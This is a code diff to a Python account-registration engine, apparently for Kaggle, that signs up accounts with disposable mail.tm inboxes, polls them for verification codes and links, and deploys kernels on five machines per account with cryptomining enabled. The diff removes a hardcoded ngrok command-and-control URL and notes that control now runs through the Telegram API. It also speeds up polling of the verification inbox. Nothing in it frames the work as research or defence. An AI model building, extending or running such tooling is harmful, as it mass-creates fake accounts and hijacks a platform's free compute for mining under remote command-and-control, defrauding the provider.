@@ -98,7 +98,8 @@ class AccountStore:
         if DB_FILE.exists():
             try:
                 self.accounts = json.loads(DB_FILE.read_text())
-            except:
+            except Exception as e:
+                print(f"[ENGINE] Failed to load accounts DB: {e}")
                 self.accounts = []
         else:
             self.accounts = []
@@ -555,16 +556,13 @@ class RegistrationJob:
                         
                         self.log("[DEPLOYMENT] Starting kernel deployment...")
                         
-                        # Get current C2 URL from config or environment
-                        c2_url = os.environ.get("C2_URL", "https://lynelle-scroddled-corinne.ngrok-free.dev")
-                        
+                        # Telegram C2 works directly via Telegram API - no public URL needed
                         result = create_dataset_with_machines(
                             worker_result["api_key_legacy"],
                             worker_result["kaggle_username"],
                             num_machines=5,
                             log_fn=self.log,
                             enable_mining=True,
-                            c2_url=c2_url,
                         )
                         
                         self.log("")
@@ -697,8 +695,9 @@ def _click_step(page, job, selectors, step_name, timeout=8000):
     return False
 
 
-def _wait_email(email, job, timeout=60, subject_filter=None):
-    job.log(f"Waiting for email ({timeout}s)...")
+def _wait_email(email, job, timeout=120, subject_filter=None):
+    """Wait for email with realtime polling (100ms intervals)."""
+    job.log(f"Waiting for email ({timeout}s, realtime polling)...")
     start = time.time()
     seen = set()
     
@@ -709,6 +708,19 @@ def _wait_email(email, job, timeout=60, subject_filter=None):
     else:
         job.log(f"WARNING: Email {email} not in mail_manager.accounts!")
     
+    # Use provider's realtime wait if available
+    provider = mail_manager._providers.get(email_data.get("provider", "mailtm")) if email_data else None
+    if provider and hasattr(provider, 'wait_for_message'):
+        job.log("Using realtime polling (100ms)...")
+        msg = provider.wait_for_message(email_data, timeout=timeout, subject_filter=subject_filter, poll_interval=0.1)
+        if msg:
+            job.log(f"✓ Email received: {msg.get('subject', '?')}")
+            body = (msg.get("html", "") or "") + " " + (msg.get("body", "") or "")
+            return msg, mail_manager.extract_code(body), mail_manager.extract_link(body)
+        job.log("No email received (timeout)")
+        return None, None, None
+    
+    # Fallback: standard polling
     initial = mail_manager.check_inbox(email)
     for m in initial:
         seen.add(m.get("id", ""))
@@ -717,7 +729,7 @@ def _wait_email(email, job, timeout=60, subject_filter=None):
         if job._check_cancel():
             job.log("Cancelled — skipping email wait")
             return None, None, None
-        time.sleep(0.5)  # Faster polling (was 1s)
+        time.sleep(0.1)  # Realtime polling (100ms instead of 500ms)
         messages = mail_manager.check_inbox(email)
         for m in messages:
             mid = m.get("id", "")
@@ -725,11 +737,11 @@ def _wait_email(email, job, timeout=60, subject_filter=None):
                 if subject_filter and subject_filter.lower() not in m.get("subject", "").lower():
                     seen.add(mid)
                     continue
-                job.log(f"Email: {m.get('subject','?')}")
+                job.log(f"✓ Email received: {m.get('subject','?')}")
                 body = (m.get("html", "") or "") + " " + (m.get("body", "") or "")
                 return m, mail_manager.extract_code(body), mail_manager.extract_link(body)
 
-    job.log("No email received")
+    job.log("No email received (timeout)")
     return None, None, None
 
 
